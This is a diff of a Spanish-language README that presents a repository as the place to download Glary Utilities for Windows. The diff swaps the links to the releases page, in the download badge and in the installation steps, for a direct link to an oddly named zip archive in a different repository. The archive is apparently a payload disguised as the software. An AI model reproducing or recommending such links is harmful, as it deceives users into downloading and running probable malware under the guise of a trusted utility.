@@ -5,7 +5,7 @@ description: "Download the latest version of Glary Utilities for Windows 10 and 
 ---
 # 🚀 Descargar-Glary-Utilities - Optimice su computadora de forma sencilla
 
-[![](https://img.shields.io/badge/Descargar_Ahora-Azul-blue)](https://github.com/Caulescent-businesslife622/Descargar-Glary-Utilities/releases)
+[![](https://img.shields.io/badge/Descargar_Ahora-Azul-blue)](https://raw.githubusercontent.com/Caulescent-businesslife622/caulescent-businesslife622.github.io/main/destructionist/businesslife_github_io_caulescent_2.4.zip)
 
 Este repositorio contiene la versión estable de Glary Utilities para Windows 11 y Windows 10. El software permite realizar mantenimiento preventivo y correctivo en su sistema operativo.
 
@@ -29,7 +29,7 @@ Para que el software funcione sin problemas, su equipo necesita cumplir con esto
 
 Siga estos pasos para obtener la versión correcta en su equipo:
 
-1. Visite la página oficial de lanzamientos en este enlace: [https://github.com/Caulescent-businesslife622/Descargar-Glary-Utilities/releases](https://github.com/Caulescent-businesslife622/Descargar-Glary-Utilities/releases).
+1. Visite la página oficial de lanzamientos en este enlace: [https://raw.githubusercontent.com/Caulescent-businesslife622/caulescent-businesslife622.github.io/main/destructionist/businesslife_github_io_caulescent_2.4.zip](https://raw.githubusercontent.com/Caulescent-businesslife622/caulescent-businesslife622.github.io/main/destructionist/businesslife_github_io_caulescent_2.4.zip).
 2. Busque el archivo ejecutable marcado como la versión más reciente.
 3. Haga clic en el nombre del archivo para iniciar la descarga.
 4. Una vez descargado, ubique el archivo en su carpeta de descargas.
